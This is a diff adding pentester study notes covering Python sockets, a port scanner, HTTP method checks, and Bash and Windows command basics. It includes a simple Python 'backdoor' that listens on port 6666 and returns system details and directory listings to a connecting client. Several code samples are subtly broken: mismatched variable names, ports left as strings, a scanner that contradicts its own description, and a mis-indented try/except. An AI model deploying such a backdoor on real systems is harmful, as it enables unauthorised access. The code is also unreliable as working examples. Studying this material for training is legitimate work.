@@ -1370,22 +1370,331 @@ from module_name import *
 ```
 
 #### (9/10) Pentester Scripting - Study Guide
-#### (10/10) Python-assisted exploitation
+
+##### Network sockets
+
+```
+""" server.py """
+""" Binds itself to a specific address and port and will listen for incoming TCP communications """
+
+import socket
+
+SVR_ADDR = input("Type the server IP address: ")
+SRV_PORT = input("Type the server port: ")
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Default family socket, using TCP and the default socket type connection-oriented (SOCK_STREAM)
+s.bind((SRV_ADDR, SRV_PORT))
+s.listen(1)
+
+print("Server started! Waiting for connections...")
+connection, address = s.accept()                      # 'connection' is the socket object we will use to send and receive data, 'address' contains the client address bound to the socket
+print('Client connected with address:', address)
+while 1:                                              # maximum number of queued connections
+  data = connection.recv(1024)
+  if not data: break
+  connection.sendall(b'-- Message Received --\n')
+  print(data.decode('utf-8'))
+connection.close()
+```
+
+```
+nc <server_ip> <port>
+```
+
+```
+""" client.py """
+import socket
+
+SVR_ADDR = input("Type the server IP address: ")
+SRV_PORT = input("Type the server port: ")
+
+my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+my_sock.connect((SVR_ADDR, SRV_PORT))
+print("Connection established")
+
+message = input("Message to send: ")
+my_sock.sendall(message.encode())
+my_sock.close()
+```
+
+##### Port Scanner
+
+- Instad of using `connect()` we'll use `connect_ex()`, which returns - if the operation succedeed
+- This script will use the full 3-way handshake
+
+```
+import socket
+
+target = input('Enter the IP address to scan: ')
+portrange = input('Enter the port range to scan (ex 5-200): ')
+
+lowport = int(portrange.split('-')[0])
+highport = int(portrange.split('-')[1])
+
+print('Scanning host ', target, 'from port', lowport, 'to port', highport)
+
+for port in range(lowport, highport):
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  status = s.connect((target, port))
+  if (status ==0):
+    print('*** Port', port, ' - OPEN ***')
+  else:
+      print('*** Port', port, ' - Closed ***')
+  s.close()
+```
+
+##### Backdoor
+
+The program simply binds itself to a NIC and a specific port (6666) and then waits for the client commands. Depending on the command received, it will return specific information to the client.
+
+```
+import socket, platform, os
+
+SRV_ADDR = ""
+SRV_PORT = 6666
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((SRV_ADDR, SRV_PORT))
+s.listen(1)
+connection, address = s.accept()
+
+while 1:
+  try:
+    data = connection.recv(1024)
+    except:continue
+
+    if(data.decode('utf-8') == '1'):
+      tosend = platform.platform() + " " + platform.machine()
+      connection.sendall(tosend.encode())
+    elif(data.decode('utf-8') == '2'):
+      data = connection.recv(1024)
+      try:
+        filelist = os.listdir(data.decode('utf-8'))
+        tosend = ""
+        for x in filelist:
+          tosend += "," + x
+      except:
+        tosend += "Wrong path"
+      connection.sendall(tosend.encode())
+    elif(data.decode('utf-8') == '0'):
+      connection.close()
+    connection, address = s.accept()
+```
+
+##### HTTP
+
+Build a Python program that, given an IP address/hostname and port, verifies if the remote Web Server has the HTTTP method `OPTIONS` enabled.
+
+If it does, it tries to enumerate all the other HTTP methods allowed.
+
+```
+import http.client
+
+host = input('Host?')
+port = input('Port?')
+
+if(port == ""):
+  port = 80
+
+try:
+  connection = http.client.HTTPConnection(host, port)
+  connection.request('OPTIONS', '/')
+  response = connection.getresponse()
+  print("Enabled methods are: ", response.getheader('allow'))
+  connection.close()
+except ConnectionRefusedError:
+  print("Connection failed")
+```
+
+
+##### HTTP, GET request and check status code
+
+```
+import http.client
+
+host = input('Host?')
+port = input('Port?')
+url = input('URL?')
+
+if(port == ""):
+  port = 80
+
+try:
+  connection = http.client.HTTPConnection(host, port)
+  connection.request('GET', url)
+  response = connection.getresponse()
+  print("Enabled methods are: ", response.status)
+  connection.close()
+except ConnectionRefusedError:
+  print("Connection failed")
+```
+
+#### <span style="color:red"> LAB - (10/10) Python-assisted exploitation</span>
 
 ### Command Line Scripting (12 items)
 
 #### (1/12) Bash Shell - Study Guide
+
+- The main non-graphical tool to interact with the operating system is Shell
+- In FreeBSD there is no GUI at all
+- Other notable shells: ksh, zsh, dash
+
 #### (2/12) Bash Environment - Study Guide
+
+- Upon the start of the shell, the OS checks for the existenc of several files as
+  - `~/.bashrc`, `~/.bash_login`, `~/.bash_profile`, `~/.bash_logout`
+- Environment Variables can be viewd by typing `env`
+- `PATH` is a relevant env variable, which has a format of `[location]:[location]:...:[location]`
+- The `PATH` variable is one of the execution helpers
+
 #### (3/12) Bash Commands and Programs - Study Guide
+
+- Bash has some built-in commands that provide basic functionality
+- Examples are: `fg`, `echo`, `set`, `while`
+- Most commands that are used in everyday tasks are external mini-programs kept in `PATH` locations (use `which` to find the real location)
+- `man` displays help about commands
+
 #### (4/12) Bash Output Redirectors and Special Characters - Study Guide
+
+- `~`: current user's home directory
+- `*`: wildcard that can be used for choosing only certain types of files
+- `$()`: will be evaluated before the whole statement and will become part of this statement
+- Use `command > file.txt` format to create a file containing command's output
+- Use `command >> file.txt` format to append containing command's output to an existing file
+- `|`: pipe
+- chaining commands is a quite powerful Bash feature, oneliners
+
+```
+file `ls /etc/*.conf | sort` > test.txt && cat test.txt | wc -l
+```
+
 #### (5/12) Bash Conditional Statements and Loops - Study Guide
-#### (6/12) Bash Scripting Part 1
-#### (7/12) Bash Scripting Part 2
+
+- `chmod +x scriptname` so you can execute this script with `./scriptname`
+
+```
+echo '#!/bin/bash' > script.sh
+echo 'ls /tmp | wc -l' >> script.sh
+chmod +x script.sh
+./script.sh
+```
+
+```
+if <conditions>; then
+<commands>
+fi
+```
+
+```
+if [ x ]; then
+  docommand
+elif [ y ]; then
+  doothercommand
+else
+  dosomethingelse
+fi
+```
+
+Conditional statements:
+
+- `-eq`: equal
+- `-ne`: not equal
+- `-lt`: less than
+- `-le`: less than or equal
+- `-gt`: greater than
+- `-ge`: greater than or equal
+
+Loops:
+
+```
+#!/bin/bash
+
+for i in $(ls); do
+  echo item: $i
+done
+```
+
+or:
+
+```
+#!/bin/bash
+for i in `seq 1 10`;
+do
+  echo $i
+done
+```
+
+While loop:
+
+```
+while [condition]; do command1; command2; done
+```
+
+for example:
+
+```
+while read line; do echo $line; done < file.txt
+```
+
+#### <span style="color: red">VIDEO - (6/12) Bash Scripting Part 1</span>
+#### <span style="color: red">VIDEO - (7/12) Bash Scripting Part 2</span>
+
 #### (8/12) Windows Command Line - Study Guide
+
+- `cmd.exe` or Windows Command Line is the Microsoft equivalent of the Linux Bash Shell.
+- Its usual location is `C:\Windows\system32\cmd.exe`
+- CMD relies mainly on built-in commands
+- Some of the are: `dir`, `cls`, `move` or `del`
+
 #### (9/12) Windows Environment - Study Guide
+
+In Windows 10: `Control Panel` > `System and Security` > `System` > `Advanced System Settings`
+- There are System variables (for all users) and for current user
+- Windows does have a `PATH` variable too, where the executable directories are separated through the `;` symbol
+-
+
 #### (10/12) Windows Commands and Programs - Study Guide
+
+- Windows CMD supports more built-in commands than the Linux one.
+- If you would like to make your newly installed software executable from the command line, syou should place it within any of your `PATH` locations or change the `PATH` variable to contain its location
+
 #### (11/12) Windows Output Redirectors and Special Characters - Study Guide
+
+- Windows CMD is a less flexible scripting env than Bash
+- PowerShell is better to create advanced scripts in Windows
+- In order to access Windows' env variables: `%varname%`
+- You can print env variables using `echo`, as in: `echo %PATH%`
+- `set` allows you to view variables
+- You can also create your own variables or temporarily modify existing ones
+- Any modifications will not be permanent and will only exist in the current `cmd.exe` window
+- Two different `cmd.exe` windows will not affect each other
+- Output redirection also works in Windows, as in `echo aaa > file.txt` or the append version: `echo bbb >> file.txt`
+- View files with `type` command: `type file.txt`
+- Some ways of command chaining:
+  - `command1 & command2`: execute both regardless of the result
+  - `command1 && command2`: execute the 2nd one if the 1st one's execution succedded
+  - `command1 | command2`: send output from the first command to the second one
+  - `command1 || command2`: execute the 1st command, and if ti fails, execute the second one
+
 #### (12/12) Windows Conditional Statements and Loops - Study Guide
+
+- `.bat` files allow you to save larger command line scripts
+
+```
+SET x=123
+if %x%==123 (echo true) # true
+if %x%==xyz (echo true) # nothing is output
+if %x%==xyz (echo true) else (echo "does not contain xyz")
+```
+
+For loop:
+
+```
+for %i in (*.*) do @echo FILE: %i
+```
+
+> `@`: hides the command propont and just display the output
 
 ## (3/3) Penetration Testing Basics
 
